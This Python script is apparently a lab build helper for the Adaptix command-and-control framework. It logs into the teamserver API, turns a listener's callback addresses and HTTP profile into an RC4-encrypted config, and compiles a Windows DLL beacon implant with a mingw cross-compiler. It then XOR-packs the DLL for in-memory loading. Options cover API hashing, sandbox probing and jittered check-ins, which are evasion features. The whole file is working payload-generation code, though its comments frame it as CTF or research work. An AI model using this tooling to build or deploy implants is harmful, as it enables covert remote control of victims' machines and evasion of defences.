#!/usr/bin/env python3
"""Build a direct_https_agent DLL payload with a real Adaptix listener profile.

This is a local research helper for the memory-loader lab. It does not change the
normal Adaptix /agent/generate Exe path. It queries the active listener profile,
rebuilds the beacon objects, compiles config.cpp with a PROFILE byte string,
links a DLL exporting RunAgentDll(), and XOR-packs the DLL into a .bin file.
"""
import argparse
import hashlib
import json
import os
import re
import ssl
import struct
import subprocess
import sys
import time
import urllib.request
from pathlib import Path

DEFAULT_ROOT = Path(__file__).resolve().parents[2]
ROOT = Path(os.environ.get("ROOT", str(DEFAULT_ROOT)))
LAB = ROOT / "research/memory-loader-lab"
AGENT_SRC = Path(os.environ.get(
    "DIRECT_HTTPS_AGENT_SRC",
    str(ROOT / "AdaptixServer/extenders/direct_https_agent/src_beacon"),
))
AGENT_CONFIG = Path(os.environ.get(
    "DIRECT_HTTPS_AGENT_CONFIG",
    str(ROOT / "AdaptixServer/extenders/direct_https_agent/config.yaml"),
))
DEFAULT_KEY = "ctf-memory-loader-key-20260624"


def sha256_file(path: Path) -> str:
    """计算文件 SHA256，用于报告和样本矩阵记录。"""
    h = hashlib.sha256()
    with path.open("rb") as f:
        for chunk in iter(lambda: f.read(1024 * 1024), b""):
            h.update(chunk)
    return h.hexdigest()


def load_env(path: Path):
    """读取 .adaptix_api.env，但不在日志中打印密码。"""
    if not path.exists():
        return
    for line in path.read_text(encoding="utf-8", errors="ignore").splitlines():
        line = line.strip()
        if not line or line.startswith("#") or "=" not in line:
            continue
        k, v = line.split("=", 1)
        os.environ.setdefault(k.strip(), v.strip().strip('"').strip("'"))


class Api:
    """Adaptix HTTP API 的极简客户端。

    本脚本只需要两个能力：
    1. /login 获取 bearer token；
    2. /listener/list 读取当前 direct_https listener profile。
    """

    def __init__(self, base, username, password):
        self.base = base.rstrip("/")
        self.username = username
        self.password = password
        self.ctx = ssl._create_unverified_context()
        self.token = None

    def req(self, path, method="GET", data=None, timeout=30):
        headers = {}
        body = None
        if self.token:
            headers["Authorization"] = "Bearer " + self.token
        if data is not None:
            headers["Content-Type"] = "application/json"
            body = json.dumps(data).encode()
        req = urllib.request.Request(self.base + path, data=body, headers=headers, method=method)
        with urllib.request.urlopen(req, context=self.ctx, timeout=timeout) as resp:
            raw = resp.read().decode("utf-8", "replace")
            return json.loads(raw) if raw else None

    def login(self):
        old = self.token
        self.token = None
        obj = self.req("/login", "POST", {"username": self.username, "password": self.password, "version": "memory-loader-profile-dll"})
        self.token = old
        self.token = obj["access_token"]


def read_agent_watermark(agent_config: Path = AGENT_CONFIG) -> str:
    """读取 direct_https_agent/config.yaml 里的 agent_watermark。

    agent_watermark 会被打进 profile，用于让 teamserver 判断回连的 agent 类型。
    如果 DLL payload 里的 watermark 和服务端配置不一致，agent 可能无法正常登记。
    """
    text = agent_config.read_text(encoding="utf-8", errors="ignore")
    m = re.search(r"agent_watermark:\s*\"?([0-9a-fA-F]+)\"?", text)
    if not m:
        raise RuntimeError(f"cannot find agent_watermark in {agent_config}")
    return m.group(1)


def pack_value(value):
    """按 direct_https beacon 侧 Packer 约定打包一个值。

    这一步必须和 Go/C++ 两侧的 PackArray/Packer 约定一致，否则 DLL 里的
    AgentConfig 解析 profile 时会错位。

    简化规则：
    - bool：1 字节；
    - int：little-endian uint32；
    - bytes：原样；
    - str：uint32 长度 + 以 NUL 结尾的字节串。
    """
    if isinstance(value, bool):
        return b"\x01" if value else b"\x00"
    if isinstance(value, int):
        return struct.pack("<I", value & 0xffffffff)
    if isinstance(value, bytes):
        return value
    if isinstance(value, str):
        raw = value.encode()
        if raw:
            raw += b"\x00"
        return struct.pack("<I", len(raw)) + raw
    raise TypeError(f"unsupported pack type: {type(value)!r}")


def pack_array(values):
    """把多个 profile 字段按顺序拼起来。字段顺序必须匹配 beacon 解析顺序。"""
    return b"".join(pack_value(v) for v in values)


def rc4(data: bytes, key: bytes) -> bytes:
    """direct_https profile 使用的 RC4 封装。

    listener 配置里有 encrypt_key。原始 profile 参数先按 Packer 格式打包，
    再用这个 key 做 RC4，最后 DLL 中的 AgentConfig 会用同一 key 解开。
    """
    s = list(range(256))
    j = 0
    out = bytearray()
    for i in range(256):
        j = (j + s[i] + key[i % len(key)]) & 0xff
        s[i], s[j] = s[j], s[i]
    i = j = 0
    for byte in data:
        i = (i + 1) & 0xff
        j = (j + s[i]) & 0xff
        s[i], s[j] = s[j], s[i]
        k = s[(s[i] + s[j]) & 0xff]
        out.append(byte ^ k)
    return bytes(out)


def parse_sleep_seconds(text: str) -> int:
    """把 1s / 5m / 1h30m 这类 sleep 字符串转成秒。"""
    text = text.strip()
    if text.isdigit():
        return int(text)
    total = 0
    consumed = ""
    for num, unit in re.findall(r"(\d+)(h|m|s)", text):
        consumed += f"{num}{unit}"
        n = int(num)
        total += n * {"h": 3600, "m": 60, "s": 1}[unit]
    if consumed != text or total <= 0:
        raise ValueError(f"invalid sleep value: {text!r}")
    return total


def split_host_port(item: str):
    """把 listener 的 callback 地址 'host:port' 拆成二元组。"""
    host, port = item.rsplit(":", 1)
    return host, int(port)


def build_profile(listener_row, sleep_value: str, jitter: int, rotation_mode: str, proxy, agent_config: Path = AGENT_CONFIG):
    """把 Adaptix listener 配置转换成 direct_https DLL 内置 PROFILE。

    这一步是“生成能真实回连 C2 的 DLL payload”的核心：
    1. 读取 listener 的 l_data；
    2. 取 callback 地址、URI、User-Agent、heartbeat header、页面模板等；
    3. 按 direct_https beacon 期望的字段顺序 pack；
    4. 用 listener encrypt_key 做 RC4；
    5. 再把 crypt_params 和 encrypt_key 打成最终 PROFILE。

    如果这里字段顺序错了，agent 可能能加载 DLL，但无法正确解析 C2 地址或
    HTTP profile，最终表现为没有 callback。
    """
    listener = json.loads(listener_row["l_data"])
    agent_watermark = int(read_agent_watermark(agent_config), 16)
    listener_watermark = int(listener_row["l_watermark"], 16)
    sleep_seconds = parse_sleep_seconds(sleep_value)
    encrypt_key = bytes.fromhex(listener["encrypt_key"])

    callback_addresses = listener.get("callback_addresses") or []
    hosts_ports = [split_host_port(x.strip()) for x in callback_addresses if str(x).strip()]
    if not hosts_ports:
        raise RuntimeError("listener has no callback_addresses")

    uris = [str(x).strip() for x in listener.get("uri") or [] if str(x).strip()]
    user_agents = [str(x).strip() for x in listener.get("user_agent") or [] if str(x).strip()] or ["Mozilla/5.0"]
    host_headers = [str(x).strip() for x in listener.get("host_header") or [] if str(x).strip()]
    page_payload = listener.get("page-payload") or ""
    marker = "<<<PAYLOAD_DATA>>>"
    ans_offset_1 = page_payload.find(marker)
    if ans_offset_1 < 0:
        raise RuntimeError("listener page-payload missing <<<PAYLOAD_DATA>>>")
    ans_offset_2 = len(page_payload[ans_offset_1 + len(marker):])

    proxy_type = 0
    if proxy.get("use_proxy"):
        proxy_type = 2 if proxy.get("proxy_type") == "https" else 1

    params = [
        agent_watermark,
        0,  # kill date
        0,  # working time
        sleep_seconds,
        jitter,
        listener_watermark,
        bool(listener.get("ssl")),
        len(hosts_ports),
    ]
    for host, port in hosts_ports:
        params += [host, port]
    params += [
        listener.get("http_method") or "POST",
        len(uris),
    ]
    params += uris
    params += [
        listener.get("hb_header") or "X-Beacon-Id",
        len(user_agents),
    ]
    params += user_agents
    params += [
        listener.get("request_headers") or "",
        ans_offset_1,
        ans_offset_2,
        len(host_headers),
    ]
    params += host_headers
    params += [
        1 if rotation_mode == "random" else 0,
        proxy_type,
        proxy.get("proxy_host") or "",
        int(proxy.get("proxy_port") or 3128),
        proxy.get("proxy_username") or "",
        proxy.get("proxy_password") or "",
    ]

    packed_params = pack_array(params)
    crypt_params = rc4(packed_params, encrypt_key)
    packed_profile = pack_array([len(crypt_params), crypt_params, encrypt_key])
    meta = {
        "listener_name": listener_row["l_name"],
        "listener_watermark": listener_row["l_watermark"],
        "agent_watermark": f"{agent_watermark:08x}",
        "sleep_seconds": sleep_seconds,
        "jitter": jitter,
        "hosts_ports": hosts_ports,
        "http_method": listener.get("http_method") or "POST",
        "uris": uris,
        "user_agents": user_agents,
        "hb_header": listener.get("hb_header") or "X-Beacon-Id",
        "request_headers_len": len(listener.get("request_headers") or ""),
        "host_headers": host_headers,
        "profile_size": len(packed_profile),
        "crypt_params_size": len(crypt_params),
    }
    return packed_profile, meta


def run(cmd, cwd=None):
    """执行外部命令并在 stdout 打印完整命令，方便报告追溯构建链。"""
    print("[*]", " ".join(map(str, cmd)))
    subprocess.run([str(x) for x in cmd], cwd=str(cwd) if cwd else None, check=True)


def main():
    """命令行入口：读取 listener -> 构建 DLL -> XOR pack -> 写 build-meta.json。"""
    ap = argparse.ArgumentParser()
    ap.add_argument("--listener", default="https_8443_1")
    ap.add_argument("--callback-address", action="append", default=[],
                    help="override listener callback_addresses; repeatable, format host:port")
    ap.add_argument("--host-header", action="append", default=[],
                    help="override listener host_header; repeatable")
    ap.add_argument("--sleep", default="4s")
    ap.add_argument("--jitter", type=int, default=0)
    ap.add_argument("--rotation-mode", default="sequential", choices=["sequential", "random"])
    ap.add_argument("--api-base", default=os.environ.get("ADAPTIX_API_BASE", "https://127.0.0.1:4321/endpoint"))
    ap.add_argument("--username", default=os.environ.get("ADAPTIX_USERNAME", "ctf"))
    ap.add_argument("--env-file", default=str(ROOT / ".adaptix_api.env"))
    ap.add_argument("--out-dir", default=str(LAB / "build/x64/profile_dll"))
    ap.add_argument("--key", default=DEFAULT_KEY)
    ap.add_argument("--probe-stage", type=int, default=-1)
    ap.add_argument("--sandbox-probe-stage", type=int, default=-1)
    ap.add_argument("--memory-loader-diag", action="store_true",
                    help="compile direct_https DLL with MMPP_LOADER_LOG based AgentMain trace logging")
    ap.add_argument("--fast-first-loops", type=int, default=0,
                    help="skip normal sleep for the first N empty check-ins, with a 100ms diagnostic pacing delay")
    ap.add_argument("--agent-src", default=str(AGENT_SRC),
                    help="direct_https src_beacon directory; defaults to active source or DIRECT_HTTPS_AGENT_SRC")
    ap.add_argument("--agent-config", default=str(AGENT_CONFIG),
                    help="direct_https config.yaml used for agent_watermark; defaults to active config or DIRECT_HTTPS_AGENT_CONFIG")
    ap.add_argument("--beat-dialect", type=int, choices=[0, 1, 2], default=None,
                    help="optional heartbeat dialect: 0=legacy, 1=LPH4, 2=LPH5 process-only identity")
    ap.add_argument("--api-hashing", action="store_true",
                    help="resolve WinAPI and WinINet symbols through the existing module/export hash path")
    ap.add_argument("--lazy-wininet-init", action="store_true",
                    help="defer wininet.dll and WinINet API initialization until the first network operation")
    ap.add_argument("--lite-connector", action="store_true",
                    help="use the compact connector implementation for the heartbeat build")
    ap.add_argument("--learning-minimal", action="store_true",
                    help="build a check-in/hello-only learning profile and omit file/process command APIs")
    ap.add_argument("--file-commands-only", action="store_true",
                    help="keep hello and file CRUD commands while omitting process and transfer tasks")
    ap.add_argument("--heartbeat-only", action="store_true",
                    help="build a WPP-compatible heartbeat-only profile without command parsing or task modules")
    ap.add_argument("--hello-only", action="store_true",
                    help="build a WPP-compatible profile that accepts only native LPT4 hello tasks")
    ap.add_argument("--initial-checkin-range-ms", nargs=2, type=int, metavar=("MIN", "MAX"),
                    help="delay the first check-in by a random inclusive MIN..MAX millisecond range")
    ns = ap.parse_args()

    if ns.heartbeat_only and ns.hello_only:
        raise SystemExit("--heartbeat-only and --hello-only are mutually exclusive")

    load_env(Path(ns.env_file))
    password = os.environ.get("ADAPTIX_PASSWORD", "")
    if not password:
        raise SystemExit("ADAPTIX_PASSWORD missing; set it in the environment or in ROOT/.adaptix_api.env")

    out_dir = Path(ns.out_dir)
    obj = out_dir / "objects"
    agent_src = Path(ns.agent_src)
    agent_config = Path(ns.agent_config)
    if not (agent_src / "Makefile").exists():
        raise SystemExit(f"agent src Makefile not found: {agent_src}")
    if not agent_config.exists():
        raise SystemExit(f"agent config not found: {agent_config}")
    out_dir.mkdir(parents=True, exist_ok=True)
    obj.mkdir(parents=True, exist_ok=True)

    api = Api(ns.api_base, ns.username, password)
    api.login()
    listeners = api.req("/listener/list")
    row = next((x for x in listeners if x.get("l_name") == ns.listener), None)
    if not row:
        raise SystemExit(f"listener not found: {ns.listener}; available={[x.get('l_name') for x in listeners]}")
    if ns.callback_address or ns.host_header:
        row = dict(row)
        listener_data = json.loads(row["l_data"])
        if ns.callback_address:
            listener_data["callback_addresses"] = ns.callback_address
        if ns.host_header:
            listener_data["host_header"] = ns.host_header
        row["l_data"] = json.dumps(listener_data)

    profile, profile_meta = build_profile(row, ns.sleep, ns.jitter, ns.rotation_mode, {
        "use_proxy": False,
        "proxy_type": "http",
        "proxy_host": "",
        "proxy_port": 3128,
        "proxy_username": "",
        "proxy_password": "",
    }, agent_config)
    profile_literal = "".join(f"\\x{b:02x}" for b in profile)
    (out_dir / "profile.bin").write_bytes(profile)

    # Build the beacon object files in two explicit make invocations instead of
    # one `make clean pre x64` call.  In the restore-feature experiments the
    # one-shot form could report "Nothing to be done for 'x64'" after `clean`
    # removed the object directory, which left the later DLL link step without
    # Agent/Commander/ApiLoader objects.  Splitting the phases and forcing x64
    # makes the profile DLL generator deterministic.
    # heartbeat-only is intentionally stricter than learning-minimal: it keeps
    # the WPP loader, profile parsing and C2 heartbeat, but removes the command
    # dispatcher and task modules from the linked DLL.
    minimal_build = ns.learning_minimal or ns.file_commands_only or ns.heartbeat_only or ns.hello_only
    make_vars = [
        f"HTTP_DIST_DIR={obj}",
        f"DIRECT_HTTPS_PROBE_STAGE={ns.probe_stage}",
        "DIRECT_HTTPS_LAZY_HTTP_SEND=1",
        f"DIRECT_HTTPS_LAZY_WININET_INIT={1 if ns.lazy_wininet_init else 0}",
        f"DIRECT_HTTPS_LITE_CONNECTOR={1 if ns.lite_connector else 0}",
        "DIRECT_HTTPS_WININET_INIT_ORDER=0",
        f"DIRECT_HTTPS_SANDBOX_PROBE_STAGE={ns.sandbox_probe_stage}",
        "DIRECT_HTTPS_DELAY_BEFORE_SEND_MS=0",
        "DIRECT_HTTPS_REQUIRE_TRIGGER_FILE=0",
        "DIRECT_HTTPS_EXIT_BEFORE_SEND=0",
        "DIRECT_HTTPS_CAPTURE_PORT_8001=0",
        f"DIRECT_HTTPS_NO_API_HASHING={0 if ns.api_hashing else 1}",
        f"DIRECT_HTTPS_MEMORY_LOADER_DIAG={1 if ns.memory_loader_diag else 0}",
        f"DIRECT_HTTPS_FAST_FIRST_LOOPS={max(0, ns.fast_first_loops)}",
        # Full builds keep the existing command/file/process surface.  The
        # learning and hello profiles only keep check-in/link-test paths;
        # file_commands_only additionally retains the file CRUD handlers.
        f"DIRECT_HTTPS_CHECKIN_ONLY={1 if minimal_build else 0}",
        f"DIRECT_HTTPS_MINIMAL_IDENTITY={1 if minimal_build else 0}",
        f"DIRECT_HTTPS_SKIP_UNUSED_API_INIT={1 if minimal_build else 0}",
        f"DIRECT_HTTPS_LEARNING_MINIMAL={1 if minimal_build else 0}",
        f"DIRECT_HTTPS_FILE_COMMANDS_ONLY={1 if ns.file_commands_only else 0}",
        f"DIRECT_HTTPS_HEARTBEAT_ONLY={1 if ns.heartbeat_only else 0}",
        f"DIRECT_HTTPS_HELLO_ONLY={1 if ns.hello_only else 0}",
        f"DIRECT_HTTPS_INITIAL_CHECKIN_MIN_MS={ns.initial_checkin_range_ms[0] if ns.initial_checkin_range_ms else 0}",
        f"DIRECT_HTTPS_INITIAL_CHECKIN_MAX_MS={ns.initial_checkin_range_ms[1] if ns.initial_checkin_range_ms else 0}",
    ]
    if ns.beat_dialect is not None:
        make_vars.append(f"DIRECT_HTTPS_BEAT_DIALECT={ns.beat_dialect}")
    run(["make", "-C", agent_src, *make_vars, "clean", "pre"])
    run(["make", "-C", agent_src, *make_vars, "-B", "x64"])

    cxx = os.environ.get("CXX", "x86_64-w64-mingw32-g++")
    run([
        cxx, "-c", obj / "config.cpp",
        f"-DPROFILE=\"{profile_literal}\"",
        f"-DPROFILE_SIZE={len(profile)}",
        "-o", obj / "config.x64.o",
    ])
    run([
        cxx, "-c", LAB / "src/direct_https_dll_entry.cpp",
        "-I", agent_src / "beacon",
        "-fpermissive", "-w", "-masm=intel", "-fPIC", "-D", "BEACON_HTTP",
        "-o", obj / "direct_https_dll_entry.x64.o",
    ])

    object_names = [
        "config", "Agent", "AgentConfig", "AgentInfo", "ApiLoader", "Commander", "ConnectorHTTP",
        "Crypt", "Downloader", "Encoders", "JobsController", "MainAgent", "MemorySaver", "Packer",
        "ProcLoader", "WaitMask", "crt", "std", "utils", "direct_https_dll_entry",
    ]
    if ns.heartbeat_only:
        object_names = [name for name in object_names if name not in {
            "Commander", "Downloader", "JobsController", "MemorySaver",
        }]
    elif ns.hello_only or ns.learning_minimal or ns.file_commands_only:
        object_names = [name for name in object_names if name not in {
            "Downloader", "JobsController", "MemorySaver",
        }]
    dll = out_dir / "direct_https_profile.x64.dll"
    bin_path = out_dir / "direct_https_profile.x64.bin"
    implib = out_dir / "libdirect_https_profile.a"
    link_cmd = [
        cxx, "-shared", "-Os", "-s", "-Wl,-s,--gc-sections", "-static-libgcc", "-static-libstdc++",
    ] + [obj / f"{name}.x64.o" for name in object_names] + ["-o", dll, f"-Wl,--out-implib,{implib}"]
    run(link_cmd)

    run(["python3", LAB / "pack_xor.py", dll, bin_path, ns.key])

    meta = {
        "built_at": time.strftime("%Y-%m-%dT%H:%M:%S%z"),
        "listener": ns.listener,
        "sleep": ns.sleep,
        "jitter": ns.jitter,
        "probe_stage": ns.probe_stage,
        "sandbox_probe_stage": ns.sandbox_probe_stage,
        "memory_loader_diag": bool(ns.memory_loader_diag),
        "fast_first_loops": max(0, ns.fast_first_loops),
        "agent_src": str(agent_src),
        "agent_config": str(agent_config),
        "beat_dialect": ns.beat_dialect,
        "api_hashing": bool(ns.api_hashing),
        "lazy_wininet_init": bool(ns.lazy_wininet_init),
        "lite_connector": bool(ns.lite_connector),
        "learning_minimal": bool(minimal_build),
        "file_commands_only": bool(ns.file_commands_only),
        "heartbeat_only": bool(ns.heartbeat_only),
        "hello_only": bool(ns.hello_only),
        "linked_modules": object_names,
        "initial_checkin_range_ms": ns.initial_checkin_range_ms,
        "profile": profile_meta,
        "dll": {"path": str(dll), "sha256": sha256_file(dll), "size": dll.stat().st_size},
        "bin": {"path": str(bin_path), "sha256": sha256_file(bin_path), "size": bin_path.stat().st_size},
        "profile_bin": {"path": str(out_dir / "profile.bin"), "sha256": sha256_file(out_dir / "profile.bin"), "size": (out_dir / "profile.bin").stat().st_size},
    }
    (out_dir / "build-meta.json").write_text(json.dumps(meta, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    print(json.dumps(meta, ensure_ascii=False, indent=2))


if __name__ == "__main__":
    main()
